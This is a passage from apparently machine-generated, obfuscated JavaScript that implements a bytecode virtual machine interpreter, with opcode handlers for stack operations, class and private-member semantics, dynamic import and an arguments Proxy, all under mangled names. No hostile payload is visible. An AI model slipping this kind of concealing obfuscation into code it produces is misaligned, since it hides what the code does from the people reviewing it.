lY=lU[0x12]||0x0;for(let lG=0x0;lG<lY&&lG<ld['length'];lG++){jq[lG]=ld[lG];}for(let lv=ld['length']<lY?ld['length']:lY;lv<C8;lv++){jq[lv]=undefined;}jw=lM;}else{C5=S(ld),CC['_$GeMxwg']=C5;for(let lS=0x0;lS<C8;lS++){jq[lS]=undefined;}jw=0x0;}break Ee;}vmg_8e0e94['_$K6W8Lo']?vmg_8e0e94['_$K6W8Lo']=![]:vmg_8e0e94['_$mOUl7D']=undefined;ja[jn++]=o(lU,ld,ly['e'],lE,undefined,undefined),jw++;break Ee;}}let lx=vmg_8e0e94['_$mOUl7D'],li=vmg_8e0e94['_$j2q9Zj'],lg=li&&li['get'](lE);lg?(vmg_8e0e94['_$K6W8Lo']=!![],vmg_8e0e94['_$mOUl7D']=lg):vmg_8e0e94['_$mOUl7D']=undefined;let lf;try{if(ll===0x0)lf=lE();else{if(ll===0x1){let lD=ja[--jn];lf=lD&&typeof lD==='object'&&M['has'](lD)?vmQ(lE,undefined,lD['value']):lE(lD);}else lf=vmQ(lE,undefined,G(C2,ll));}ja[jn++]=lf;}finally{lg&&(vmg_8e0e94['_$K6W8Lo']=![]),vmg_8e0e94['_$mOUl7D']=lx;}jw++;}break;}case 0x40:{Eh:{let lB=jI[jw];if(jk&&jk['length']>0x0){let lF=jk[jk['length']-0x1];if(lF['_$9BLmcO']!==undefined&&lB>=lF['_$iPzJWv']){jV=!![],jH=lB,jw=lF['_$9BLmcO'];break Eh;}}jw=lB;}break;}case 0x2:{Ec:{ja[jn++]=null,jw++;}break;}case 0x4a:{Ep:{let lK,lQ;CZ!=null?(lQ=ja[--jn],lK=jJ[CZ]):(lK=ja[--jn],lQ=ja[--jn]);let lr=delete lQ[lK];if(CE['_$PrfoPg']&&!lr)throw new TypeError('Cannot\x20delete\x20property\x20\x27'+String(lK)+'\x27\x20of\x20object');ja[jn++]=lr,jw++;}break;}case 0x53:{N0:{let lA=ja[--jn],la=ja[--jn],ln=jJ[CZ];vmZ(la,ln,{'value':lA,'writable':!![],'enumerable':!![],'configurable':!![]}),typeof lA==='function'&&(!vmg_8e0e94['_$j2q9Zj']&&(vmg_8e0e94['_$j2q9Zj']=new WeakMap()),vmg_8e0e94['_$j2q9Zj']['set'](lA,la)),jw++;}break;}case 0x16:{N1:{let lq=ja[--jn],lw=ja[--jn];ja[jn++]=lw^lq,jw++;}break;}case 0x34:{N2:{!ja[--jn]?jw=jI[jw]:jw++;}break;}case 0x54:{N3:{let lJ=ja[--jn],ls=ja[--jn],lI=ja[--jn];vmZ(lI,ls,{'value':lJ,'writable':!![],'enumerable':!![],'configurable':!![]}),typeof lJ==='function'&&(!vmg_8e0e94['_$j2q9Zj']&&(vmg_8e0e94['_$j2q9Zj']=new WeakMap()),vmg_8e0e94['_$j2q9Zj']['set'](lJ,lI)),jw++;}break;}case 0x2e:{N4:{let lW=ja[--jn],lu=ja[--jn];ja[jn++]=lu>lW,jw++;}break;}case 0x13:{N5:{ja[jn-0x1]=+ja[jn-0x1],jw++;}break;}case 0x9:{N6:{jF[CZ]=ja[--jn],jw++;}break;}case 0x51:{N7:{let lO=ja[--jn],lz=ja[jn-0x1];lO!==null&&lO!==undefined&&Object['assign'](lz,lO),jw++;}break;}case 0x8:{N8:{ja[jn++]=jF[CZ],jw++;}break;}case 0x3f:{N9:{let lo=jI[jw];if(jk&&jk['length']>0x0){let lt=jk[jk['length']-0x1];if(lt['_$9BLmcO']!==undefined&&lo>=lt['_$iPzJWv']){jR=!![],jm=lo,jw=lt['_$9BLmcO'];break N9;}}jw=lo;}break;}case 0x4f:{Nj:{let lk=ja[--jn],lT=ja[--jn];ja[jn++]=lT in lk,jw++;}break;}case 0x29:{NC:{let lX=ja[--jn],lL=ja[--jn];ja[jn++]=lL!=lX,jw++;}break;}case 0x0:{Nl:{ja[jn++]=jJ[CZ],jw++;}break;}case 0x4c:{NE:{let lR=ja[--jn],lm=jJ[CZ];if(vmg_8e0e94['_$Y9dSnQ']&&lm in vmg_8e0e94['_$Y9dSnQ'])throw new ReferenceError('Cannot\x20access\x20\x27'+lm+'\x27\x20before\x20initialization');let lV=!(lm in vmg_8e0e94)&&!(lm in vmd);vmg_8e0e94[lm]=lR,lm in vmd&&(vmd[lm]=lR),lV&&(vmd[lm]=lR),ja[jn++]=lR,jw++;}break;}case 0xa:{NN:{let lH=ja[--jn],lP=ja[--jn];ja[jn++]=lP+lH,jw++;}break;}case 0x32:{Ny:{jw=jI[jw];}break;}case 0x52:{Nx:{let le=ja[--jn],lh=ja[--jn];lh===null||lh===undefined?ja[jn++]=undefined:ja[jn++]=lh[le],jw++;}break;}case 0x4e:{Ni:{let lc=ja[--jn],lp=jJ[CZ];lc===null||lc===undefined?ja[jn++]=undefined:ja[jn++]=lc[lp],jw++;}break;}case 0x4:{Ng:{let E0=ja[jn-0x1];ja[jn++]=E0,jw++;}break;}case 0x2a:{Nf:{let E1=ja[--jn],E2=ja[--jn];ja[jn++]=E2===E1,jw++;}break;}case 0x1:{NU:{ja[jn++]=undefined,jw++;}break;}case 0x3d:{Nd:{if(jk&&jk['length']>0x0){let E3=jk[jk['length']-0x1];E3['_$9BLmcO']===jw&&(E3['_$XEwkUm']!==undefined&&(jT=E3['_$XEwkUm']),jk['pop']());}jw++;}break;}case 0x46:{NM:{let E4=ja[--jn],E5=jJ[CZ];if(E4===null||E4===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(E5)+'\x27\x20of\x20'+E4);ja[jn++]=E4[E5],jw++;}break;}case 0xd:{Nb:{let E6=ja[--jn],E7=ja[--jn];ja[jn++]=E7/E6,jw++;}break;}case 0x37:{NZ:{let E8=ja[--jn],E9=ja[--jn],Ej=ja[--jn];if(typeof E9!=='function')throw new TypeError(E9+'\x20is\x20not\x20a\x20function');let EC=vmg_8e0e94['_$j2q9Zj'],El=EC&&EC['get'](E9),EE=vmg_8e0e94['_$mOUl7D'];El&&(vmg_8e0e94['_$K6W8Lo']=!![],vmg_8e0e94['_$mOUl7D']=El);let EN;try{if(E8===0x0)EN=vmQ(E9,Ej,[]);else{if(E8===0x1){let Ey=ja[--jn];EN=Ey&&typeof Ey==='object'&&M['has'](Ey)?vmQ(E9,Ej,Ey['value']):vmQ(E9,Ej,[Ey]);}else EN=vmQ(E9,Ej,G(C2,E8));}ja[jn++]=EN;}finally{El&&(vmg_8e0e94['_$K6W8Lo']=![],vmg_8e0e94['_$mOUl7D']=EE);}jw++;}break;}case 0x10:{NY:{let Ex=ja[--jn];ja[jn++]=typeof Ex===f?Ex+0x1n:+Ex+0x1,jw++;}break;}case 0x15:{NG:{let Ei=ja[--jn],Eg=ja[--jn];ja[jn++]=Eg|Ei,jw++;}break;}case 0x38:{Nv:{if(jk&&jk['length']>0x0){let Ef=jk[jk['length']-0x1];if(Ef['_$9BLmcO']!==undefined){jX=!![],jL=ja[--jn],jw=Ef['_$9BLmcO'];break Nv;}}return jX&&(jX=![],jL=undefined),Cl=ja[--jn],0x1;}break;}case 0x2b:{NS:{let EU=ja[--jn],Ed=ja[--jn];ja[jn++]=Ed!==EU,jw++;}break;}case 0xc:{ND:{let EM=ja[--jn],Eb=ja[--jn];ja[jn++]=Eb*EM,jw++;}break;}}},Cx=function(Cb,CZ){switch(Cb){case 0x82:{Nm:{let CG=ja[--jn],Cv=CG['next']();ja[jn++]=Promise['resolve'](Cv),jw++;}break;}case 0xa4:{NV:{ja[jn++]=jr,jw++;}break;}case 0x90:{NH:{let CS=ja[--jn],CD=ja[jn-0x1],CB=jJ[CZ];vmZ(CD['prototype'],CB,{'value':CS,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x91:{NP:{let CF=ja[--jn],CK=ja[jn-0x1],CQ=jJ[CZ],Cr=D(CK);vmZ(Cr,CQ,{'get':CF,'enumerable':Cr===CK,'configurable':!![]}),jw++;}break;}case 0x7b:{Ne:{let CA=ja[--jn],Ca=CA['next']();ja[jn++]=Ca,jw++;}break;}case 0x83:{Nh:{let Cn=ja[--jn];Cn&&typeof Cn['return']==='function'?ja[jn++]=Promise['resolve'](Cn['return']()):ja[jn++]=Promise['resolve'](),jw++;}break;}case 0x97:{Nc:{let Cq=ja[--jn],Cw=ja[--jn],CJ=jJ[CZ],Cs=A(),CI='set_'+CJ,CW=Cs['get'](CI);if(CW&&CW['has'](Cw)){let Co=CW['get'](Cw);Co['call'](Cw,Cq),ja[jn++]=Cq,jw++;break Nc;}let Cu='_$XyWOr0'+'set_'+CJ['substring'](0x1)+'_$5OGgh7';if(Cw['constructor']&&Cu in Cw['constructor']){let Ct=Cw['constructor'][Cu];Ct['call'](Cw,Cq),ja[jn++]=Cq,jw++;break Nc;}let CO=Cs['get'](CJ);if(CO&&CO['has'](Cw)){CO['set'](Cw,Cq),ja[jn++]=Cq,jw++;break Nc;}let Cz=q(CJ);if(Cz in Cw){Cw[Cz]=Cq,ja[jn++]=Cq,jw++;break Nc;}throw new TypeError('Cannot\x20write\x20private\x20member\x20'+CJ+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x68:{Np:{let Ck=ja[--jn],CT=G(C2,Ck),CX=ja[--jn];if(typeof CX!=='function')throw new TypeError(CX+'\x20is\x20not\x20a\x20constructor');if(b['has'](CX))throw new TypeError(CX['name']+'\x20is\x20not\x20a\x20constructor');let CL=vmg_8e0e94['_$mOUl7D'];vmg_8e0e94['_$mOUl7D']=undefined;let CR;try{CR=Reflect['construct'](CX,CT);}finally{vmg_8e0e94['_$mOUl7D']=CL;}ja[jn++]=CR,jw++;}break;}case 0x69:{y0:{let Cm=ja[--jn],CV=G(C2,Cm),CH=ja[--jn];if(CZ===0x1){ja[jn++]=CV,jw++;break y0;}if(vmg_8e0e94['_$JaeRAU']){jw++;break y0;}let CP=vmg_8e0e94['_$kbZqo7'];if(CP){let Ce=CP['parent'],Ch=CP['newTarget'],Cc=Reflect['construct'](Ce,CV,Ch);jA&&jA!==Cc&&vmv(jA)['forEach'](function(Cp){!(Cp in Cc)&&(Cc[Cp]=jA[Cp]);});jA=Cc,CE['_$EnCqdU']=!![];CE['_$gGmnny']&&(K(CE['_$pS9Iwn'],'__this__'),!CE['_$pS9Iwn']['_$Ejew7m']&&(CE['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CE['_$pS9Iwn']['_$Ejew7m']['__this__']=jA);jw++;break y0;}if(typeof CH!=='function')throw new TypeError('Super\x20expression\x20must\x20be\x20a\x20constructor');vmg_8e0e94['_$iBkIOU']=jr;try{let Cp=CH['apply'](jA,CV);Cp!==undefined&&Cp!==jA&&typeof Cp==='object'&&(jA&&Object['assign'](Cp,jA),jA=Cp),CE['_$EnCqdU']=!![],CE['_$gGmnny']&&(K(CE['_$pS9Iwn'],'__this__'),!CE['_$pS9Iwn']['_$Ejew7m']&&(CE['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CE['_$pS9Iwn']['_$Ejew7m']['__this__']=jA);}catch(l0){if(l0 instanceof TypeError&&(l0['message']['includes']('\x27new\x27')||l0['message']['includes']('constructor'))){let l1=Reflect['construct'](CH,CV,jr);l1!==jA&&jA&&Object['assign'](l1,jA),jA=l1,CE['_$EnCqdU']=!![],CE['_$gGmnny']&&(K(CE['_$pS9Iwn'],'__this__'),!CE['_$pS9Iwn']['_$Ejew7m']&&(CE['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CE['_$pS9Iwn']['_$Ejew7m']['__this__']=jA);}else throw l0;}finally{delete vmg_8e0e94['_$iBkIOU'];}jw++;}break;}case 0x6a:{y1:{let l2=ja[--jn];ja[jn++]=import(l2),jw++;}break;}case 0x94:{y2:{let l3=ja[--jn],l4=ja[jn-0x1],l5=jJ[CZ];vmZ(l4,l5,{'get':l3,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0xa5:{y3:{ja[jn++]=vmM[CZ],jw++;}break;}case 0x5d:{y4:{let l6=ja[--jn],l7={'value':Array['isArray'](l6)?l6:Array['from'](l6)};M['add'](l7),ja[jn++]=l7,jw++;}break;}case 0x9a:{y5:{let l8=ja[--jn],l9=ja[--jn],lj=jJ[CZ],lC=null,ll=a();if(ll){let ly=ll['get'](lj);ly&&ly['has'](l9)&&(lC=ly['get'](l9));}if(lC===null){let lx=w(lj);lx in l9&&(lC=l9[lx]);}if(lC===null)throw new TypeError('Cannot\x20read\x20private\x20member\x20'+lj+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');if(typeof lC!=='function')throw new TypeError(lj+'\x20is\x20not\x20a\x20function');let lE=G(C2,l8),lN=lC['apply'](l9,lE);ja[jn++]=lN,jw++;}break;}case 0x8e:{y6:{let li=ja[--jn],lg=ja[--jn],lf=vmg_8e0e94['_$mOUl7D'],lU=lf?vmB(lf):B(lg),ld=F(lU,li);if(ld['desc']&&ld['desc']['get']){let lb=ld['desc']['get']['call'](lg);ja[jn++]=lb,jw++;break y6;}if(ld['desc']&&ld['desc']['set']&&!('value'in ld['desc'])){ja[jn++]=undefined,jw++;break y6;}let lM=ld['proto']?ld['proto'][li]:lU[li];if(typeof lM==='function'){let lZ=ld['proto']||lU,lY=lM['bind'](lg),lG=lM['constructor']&&lM['constructor']['name'],lv=lG==='GeneratorFunction'||lG==='AsyncFunction'||lG==='AsyncGeneratorFunction';!lv&&(!vmg_8e0e94['_$j2q9Zj']&&(vmg_8e0e94['_$j2q9Zj']=new WeakMap()),vmg_8e0e94['_$j2q9Zj']['set'](lY,lZ)),ja[jn++]=lY;}else ja[jn++]=lM;jw++;}break;}case 0xb9:{y7:{let lS=ja[--jn],lD=ja[--jn],lB=ja[jn-0x1];vmZ(lB,lD,{'set':lS,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x5a:{y8:{ja[jn++]=[],jw++;}break;}case 0x8c:{y9:{let lF=ja[--jn],lK=ja[--jn],lQ=CZ,lr=function(lA,la){let ln=function(){if(lA){la&&(vmg_8e0e94['_$YQ0riY']=ln);let lq='_$iBkIOU'in vmg_8e0e94;!lq&&(vmg_8e0e94['_$iBkIOU']=new.target);try{let lw=lA['apply'](this,S(arguments));if(la&&lw!==undefined&&(typeof lw!=='object'||lw===null))throw new TypeError('Derived\x20constructors\x20may\x20only\x20return\x20object\x20or\x20undefined');return lw;}finally{la&&delete vmg_8e0e94['_$YQ0riY'],!lq&&delete vmg_8e0e94['_$iBkIOU'];}}};return ln;}(lK,lQ);lF&&vmZ(lr,'name',{'value':lF,'configurable':!![]}),ja[jn++]=lr,jw++;}break;}case 0xa6:{yj:{ja[jn++]=vmb[CZ],jw++;}break;}case 0x9d:{yC:{let lA=ja[--jn],la=jJ[CZ],ln=a();if(ln){let lJ='get_'+la,ls=ln['get'](lJ);if(ls&&ls['has'](lA)){let lW=ls['get'](lA);ja[jn++]=lW['call'](lA),jw++;break yC;}let lI=ln['get'](la);if(lI&&lI['has'](lA)){ja[jn++]=lI['get'](lA),jw++;break yC;}}let lq='_$XyWOr0'+'get_'+la['substring'](0x1)+'_$5OGgh7';if(lq in lA){let lu=lA[lq];ja[jn++]=lu['call'](lA),jw++;break yC;}let lw=q(la);if(lw in lA){ja[jn++]=lA[lw],jw++;break yC;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+la+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0xb6:{yl:{let lO=ja[--jn],lz=ja[--jn],lo=ja[jn-0x1],lt=D(lo);vmZ(lt,lz,{'get':lO,'enumerable':lt===lo,'configurable':!![]}),jw++;}break;}case 0x5b:{yE:{let lk=ja[--jn],lT=ja[jn-0x1];lT['push'](lk),jw++;}break;}case 0xb5:{yN:{let lX=ja[--jn],lL=ja[--jn],lR=ja[jn-0x1];vmZ(lR,lL,{'value':lX,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x98:{yy:{let lm=ja[--jn],lV=ja[--jn],lH=jJ[CZ],lP=A();!lP['has'](lH)&&lP['set'](lH,new WeakMap());let le=lP['get'](lH);if(le['has'](lV))throw new TypeError('Cannot\x20initialize\x20'+lH+'\x20twice\x20on\x20the\x20same\x20object');le['set'](lV,lm),jw++;}break;}case 0xb4:{yx:{let lh=ja[--jn],lc=ja[--jn],lp=ja[jn-0x1];vmZ(lp['prototype'],lc,{'value':lh,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0xa3:{yi:{ja[--jn],ja[jn++]=undefined,jw++;}break;}case 0x6f:{yg:{let E0=ja[--jn],E1=ja[--jn];ja[jn++]=E1 instanceof E0,jw++;}break;}case 0xa9:{yf:{let E2=ja[--jn];ja[jn++]=Symbol['keyFor'](E2),jw++;}break;}case 0x92:{yU:{let E3=ja[--jn],E4=ja[jn-0x1],E5=jJ[CZ],E6=D(E4);vmZ(E6,E5,{'set':E3,'enumerable':E6===E4,'configurable':!![]}),jw++;}break;}case 0xb8:{yd:{let E7=ja[--jn],E8=ja[--jn],E9=ja[jn-0x1];vmZ(E9,E8,{'get':E7,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x93:{yM:{let Ej=ja[--jn],EC=ja[jn-0x1],El=jJ[CZ];vmZ(EC,El,{'value':Ej,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x64:{yb:{let EE=ja[--jn],EN=typeof EE==='object'?EE:jv(EE),Ey=EN&&EN[0xc],Ex=EN&&EN[0x8],Ei=EN&&EN[0xd],Eg=EN&&EN[0x0],Ef=EN&&EN[0x12]||0x0,EU=EN&&EN[0x6],Ed=Ey?CE['_$7e7bv7']:undefined,EM=CE['_$pS9Iwn'],Eb;if(Ei)Eb=I(jD,EE,EM,b,EU,vmd);else{if(Ex){if(Ey)Eb=u(jS,EE,EM,Ed);else Eg?Eb=z(jS,EE,EM,EU,vmd):Eb=s(jS,EE,EM,EU,vmd);}else{if(Ey)Eb=W(T,EE,EM,Ed);else Eg?Eb=O(T,EE,EM,EU,vmd):Eb=J(T,EE,EM,EU,vmd);}}Y(Eb,'length',{'value':Ef,'writable':![],'enumerable':![],'configurable':!![]}),ja[jn++]=Eb,jw++;}break;}case 0xa7:{yZ:{if(CZ===-0x1)ja[jn++]=Symbol();else{let EZ=ja[--jn];ja[jn++]=Symbol(EZ);}jw++;}break;}case 0xb7:{yY:{let EY=ja[--jn],EG=ja[--jn],Ev=ja[jn-0x1],ES=D(Ev);vmZ(ES,EG,{'set':EY,'enumerable':ES===Ev,'configurable':!![]}),jw++;}break;}case 0x5e:{yG:{let ED=ja[--jn],EB=ja[jn-0x1];if(Array['isArray'](ED))Array['prototype']['push']['apply'](EB,ED);else for(let EF of ED){EB['push'](EF);}jw++;}break;}case 0x81:{yv:{let EK=ja[--jn];if(EK==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+EK);let EQ=EK[Symbol['asyncIterator']];if(typeof EQ==='function')ja[jn++]=EQ['call'](EK);else{let Er=EK[Symbol['iterator']];if(typeof Er!=='function')throw new TypeError('Object\x20is\x20not\x20async\x20iterable');ja[jn++]=Er['call'](EK);}jw++;}break;}case 0x8f:{yS:{let EA=ja[--jn],Ea=ja[--jn],En=ja[--jn],Eq=B(En),Ew=F(Eq,Ea);Ew['desc']&&Ew['desc']['set']?Ew['desc']['set']['call'](En,EA):En[Ea]=EA,ja[jn++]=EA,jw++;}break;}case 0x8d:{yD:{let EJ=ja[--jn],Es=ja[jn-0x1];if(EJ===null){vmD(Es['prototype'],null),vmD(Es,Function['prototype']),Es['_$LOrFnP']=null,jw++;break yD;}if(typeof EJ!=='function')throw new TypeError('Class\x20extends\x20value\x20'+String(EJ)+'\x20is\x20not\x20a\x20constructor\x20or\x20null');let EI=![];try{let EW=vmY(EJ['prototype']),Eu=EJ['apply'](EW,[]);Eu!==undefined&&Eu!==EW&&(EI=!![]);}catch(EO){EO instanceof TypeError&&(EO['message']['includes']('\x27new\x27')||EO['message']['includes']('constructor')||EO['message']['includes']('Illegal\x20constructor'))&&(EI=!![]);}if(EI){let Ez=Es,Eo=vmg_8e0e94,Et='_$iBkIOU',Ek='_$YQ0riY',ET='_$kbZqo7';function CY(...EX){let EL=vmY(EJ['prototype']);Eo[ET]={'parent':EJ,'newTarget':new.target||CY},Eo[Ek]=new.target||CY;let ER=Et in Eo;!ER&&(Eo[Et]=new.target);try{let Em=Ez['apply'](EL,EX);Em!==undefined&&typeof Em==='object'&&(EL=Em);}finally{delete Eo[ET],delete Eo[Ek],!ER&&delete Eo[Et];}return EL;}CY['prototype']=vmY(EJ['prototype']),CY['prototype']['constructor']=CY,vmD(CY,EJ),vmv(Ez)['forEach'](function(EX){EX!=='prototype'&&EX!=='length'&&EX!=='name'&&Y(CY,EX,vmG(Ez,EX));});Ez['prototype']&&(vmv(Ez['prototype'])['forEach'](function(EX){EX!=='constructor'&&Y(CY['prototype'],EX,vmG(Ez['prototype'],EX));}),vmS(Ez['prototype'])['forEach'](function(EX){Y(CY['prototype'],EX,vmG(Ez['prototype'],EX));}));ja[--jn],ja[jn++]=CY,CY['_$LOrFnP']=EJ,jw++;break yD;}vmD(Es['prototype'],EJ['prototype']),vmD(Es,EJ),Es['_$LOrFnP']=EJ,jw++;}break;}case 0xa2:{yB:{let EX=CZ&0xffff,EL=CZ>>0x10,ER=jJ[EX],Em=jJ[EL];ja[jn++]=new RegExp(ER,Em),jw++;}break;}case 0xa8:{yF:{let EV=jJ[CZ];ja[jn++]=Symbol['for'](EV),jw++;}break;}case 0x99:{yK:{let EH=ja[--jn],EP=jJ[CZ],Ee=![],Eh=a();if(Eh){let Ec=Eh['get'](EP);Ec&&Ec['has'](EH)&&(Ee=!![]);}ja[jn++]=Ee,jw++;}break;}case 0x9b:{yQ:{let Ep=ja[--jn],N0=jJ[CZ];if(Ep==null){ja[jn++]=undefined,jw++;break yQ;}let N1=A(),N2=N1['get'](N0);if(!N2||!N2['has'](Ep))throw new TypeError('Cannot\x20read\x20private\x20member\x20'+N0+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');ja[jn++]=N2['get'](Ep),jw++;}break;}case 0x7c:{yr:{let N3=ja[--jn];N3&&typeof N3['return']==='function'&&N3['return'](),jw++;}break;}case 0xa1:{yA:{if(C6===null){if(CE['_$PrfoPg']||!CE['_$ljpiDP']){let N4=CE['_$GeMxwg']||jF,N5=N4?N4['length']:0x0;C6=vmY(Object['prototype']);for(let N6=0x0;N6<N5;N6++){C6[N6]=N4[N6];}vmZ(C6,'length',{'value':N5,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(C6,Symbol['iterator'],{'value':Array['prototype'][Symbol['iterator']],'writable':!![],'enumerable':![],'configurable':!![]}),C6=new Proxy(C6,{'has':function(N7,N8){if(N8===Symbol['toStringTag'])return![];return N8 in N7;},'get':function(N7,N8,N9){if(N8===Symbol['toStringTag'])return'Arguments';return Reflect['get'](N7,N8,N9);}}),CE['_$PrfoPg']?vmZ(C6,'callee',{'get':d,'set':d,'enumerable':![],'configurable':![]}):vmZ(C6,'callee',{'value':jQ,'writable':!![],'enumerable':![],'configurable':!![]});}else{let N7=jF?jF['length']:0x0,N8={},N9={},Nj=jQ,NC=![],Nl=!![],NE={},NN=function(Nf){if(typeof Nf!=='string')return NaN;let NU=+Nf;return NU>=0x0&&NU%0x1===0x0&&String(NU)===Nf?NU:NaN;},Ny=function(Nf){return!isNaN(Nf)&&Nf>=0x0;},Nx=function(Nf){if(Nf in N9)return undefined;if(Nf in N8)return N8[Nf];return Nf<jF['length']?jF[Nf]:undefined;},Ni=function(Nf){if(Nf in N9)return![];if(Nf in N8)return!![];return Nf<jF['length']?Nf in jF:![];},Ng={};vmZ(Ng,'length',{'value':N7,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(Ng,'callee',{'value':jQ,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(Ng,Symbol['iterator'],{'value':Array['prototype'][Symbol['iterator']],'writable':!![],'enumerable':![],'configurable':!![]}),C6=new Proxy(Ng,{'get':function(Nf,NU,Nd){if(NU==='length')return N7;if(NU==='callee')return NC?undefined:Nj;if(NU===Symbol['toStringTag'])return'Arguments';let NM=NN(NU);if(Ny(NM)){if(NM in NE)return Reflect['get'](Nf,NU,Nd);return Nx(NM);}return Reflect['get'](Nf,NU,Nd);},'set':function(Nf,NU,Nd){if(NU==='length'){if(!Nl)return![];return N7=Nd,Nf['length']=Nd,!![];}if(NU==='callee')return Nj=Nd,NC=![],Nf['callee']=Nd,!![];let NM=NN(NU);if(Ny(NM)){if(NM in NE)return Reflect['set'](Nf,NU,Nd);let Nb=vmG(Nf,String(NM));if(Nb&&!Nb['writable'])return![];if(NM in N9)delete N9[NM],N8[NM]=Nd;else NM<jF['length']?jF[NM]=Nd:N8[NM]=Nd;return!![];}return Nf[NU]=Nd,!![];},'has':function(Nf,NU){if(NU==='length')return!![];if(NU==='callee')return!NC;if(NU===Symbol['toStringTag'])return![];let Nd=NN(NU);if(Ny(Nd)){if(String(Nd)in Nf)return!![];return Ni(Nd);}return NU in Nf;},'defineProperty':function(Nf,NU,Nd){if(NU==='length')return'value'in Nd&&(N7=Nd['value']),'writable'in Nd&&(Nl=Nd['writable']),vmZ(Nf,NU,Nd),!![];if(NU==='callee')return'value'in Nd&&(Nj=Nd['value']),NC=![],vmZ(Nf,NU,Nd),!![];let NM=NN(NU);if(Ny(NM)){if('get'in Nd||'set'in Nd)NE[NM]=0x1,NM in N8&&delete N8[NM],NM in N9&&delete N9[NM];else'value'in Nd&&(NM<jF['length']&&!(NM in N9)?jF[NM]=Nd['value']:(N8[NM]=Nd['value'],NM in N9&&delete N9[NM]));return vmZ(Nf,String(NM),Nd),!![];}return vmZ(Nf,NU,Nd),!![];},'deleteProperty':function(Nf,NU){if(NU==='callee')return NC=!![],delete Nf['callee'],!![];let Nd=NN(NU);return Ny(Nd)&&(Nd in NE&&delete NE[Nd],Nd<jF['length']?N9[Nd]=0x1:delete N8[Nd]),delete Nf[NU],!![];},'preventExtensions':function(Nf){let NU=jF?jF['length']:0x0;for(let Nd=0x0;Nd<NU;Nd++){!(Nd in N9)&&!vmG(Nf,String(Nd))&&vmZ(Nf,String(Nd),{'value':Nx(Nd),'writable':!![],'enumerable':!![],'configurable':!![]});}for(let NM in N8){!vmG(Nf,NM)&&vmZ(Nf,NM,{'value':N8[NM],'writable':!![],'enumerable':!![],'configurable':!![]});}return Object['preventExtensions'](Nf),!![];},'getOwnPropertyDescriptor':function(Nf,NU){if(NU==='callee'){if(NC)return undefined;return vmG(Nf,'callee');}if(NU==='length')return vmG(Nf,'length');let Nd=NN(NU);if(Ny(Nd)){if(Nd in NE)return vmG(Nf,NU);if(Ni(Nd)){let Nb=vmG(Nf,String(Nd));return{'value':Nx(Nd),'writable':Nb?Nb['writable']:!![],'enumerable':Nb?Nb['enumerable']:!![],'configurable':Nb?Nb['configurable']:!![]};}return vmG(Nf,NU);}let NM=vmG(Nf,NU);if(NM)return NM;return undefined;},'ownKeys':function(Nf){let NU=[],Nd=jF?jF['length']:0x0;for(let Nb=0x0;Nb<Nd;Nb++){!(Nb in N9)&&NU['push'](String(Nb));}for(let NZ in N8){NU['indexOf'](NZ)===-0x1&&NU['push'](NZ);}NU['push']('length');!NC&&NU['push']('callee');let NM=Reflect['ownKeys'](Nf);for(let NY=0x0;NY<NM['length'];NY++){NU['indexOf'](NM[NY])===-0x1&&NU['push'](NM[NY]);}return NU;}});}}ja[jn++]=C6,jw++;}break;}case 0xa0:{ya:{if(CE['_$RGOBBT']&&!CE['_$EnCqdU'])throw new ReferenceError('Must\x20call\x20super\x20constructor\x20in\x20derived\x20class\x20before\x20accessing\x20\x27this\x27\x20or\x20returning\x20from\x20derived\x20constructor');ja[jn++]=jA,jw++;}break;}case 0x6e:{yn:{ja[jn-0x1]=typeof ja[jn-0x1],jw++;}break;}case 0x80:{yq:{let Nf=ja[--jn];ja[jn++]=!!Nf['done'],jw++;}break;}case 0x9c:{yw:{let NU=ja[--jn];ja[--jn];let Nd=ja[jn-0x1],NM=jJ[CZ],Nb=A();!Nb['has'](NM)&&Nb['set'](NM,new WeakMap());let NZ=Nb['get'](NM);NZ['set'](Nd,NU),jw++;}break;}case 0x95:{yJ:{let NY=ja[--jn],NG=ja[jn-0x1],Nv=jJ[CZ];vmZ(NG,Nv,{'set':NY,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x5f:{ys:{let NS=ja[jn-0x1];NS['length']++,jw++;}break;}case 0x70:{yI:{let ND=jJ[CZ];ND in vmg_8e0e94?ja[jn++]=typeof vmg_8e0e94[ND]:ja[jn++]=typeof vmd[ND],jw++;}break;}case 0x7f:{yW:{let NB=ja[--jn];if(NB==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+NB);let NF=NB[Symbol['iterator']];if(typeof NF!=='function')throw new TypeError('Object\x20is\x20not\x20iterable');ja[jn++]=vmQ(NF,NB,[]),jw++;}break;}case 0x9e:{yu:{let NK=ja[--jn],NQ=ja[--jn],Nr=jJ[CZ],NA=a();if(NA){let Nq='set_'+Nr,Nw=NA['get'](Nq);if(Nw&&Nw['has'](NQ)){let Ns=Nw['get'](NQ);Ns['call'](NQ,NK),ja[jn++]=NK,jw++;break yu;}let NJ=NA['get'](Nr);if(NJ&&NJ['has'](NQ)){NJ['set'](NQ,NK),ja[jn++]=NK,jw++;break yu;}}let Na='_$XyWOr0'+'set_'+Nr['substring'](0x1)+'_$5OGgh7';if(Na in NQ){let NI=NQ[Na];NI['call'](NQ,NK),ja[jn++]=NK,jw++;break yu;}let Nn=q(Nr);if(Nn in NQ){NQ[Nn]=NK,ja[jn++]=NK,jw++;break yu;}throw new 